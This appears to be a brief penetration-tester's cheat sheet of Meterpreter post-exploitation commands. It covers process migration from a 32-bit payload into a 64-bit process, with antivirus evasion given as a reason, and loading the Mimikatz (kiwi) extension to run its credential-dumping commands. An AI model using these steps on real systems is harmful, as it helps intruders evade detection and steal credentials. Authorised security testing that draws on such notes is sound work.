# Meterpreter tips

## Process migration
```
Avoid running a x32 payload inside a x64 arch machine bacause of the following reasons :
- crashes / silent crashes
  - due to inability to interact with/inject into x64 processes due to the WOW64 subsystem isolation
- opsec
  - x32 process on a x64 machine stick out
  - AV focus on the injected x32 processes

Migrate  away :
getpid         # shows current process ID
sysinfo        # shows OS architecture
ps             # list running processes
migrate <PID>  # migrate to a chosen x64 process
```
## Mimikatz args
```
# Correct way of passing args to mimikatz
load_kiwi
kiwi_cmd '"cmd + args here "'
```
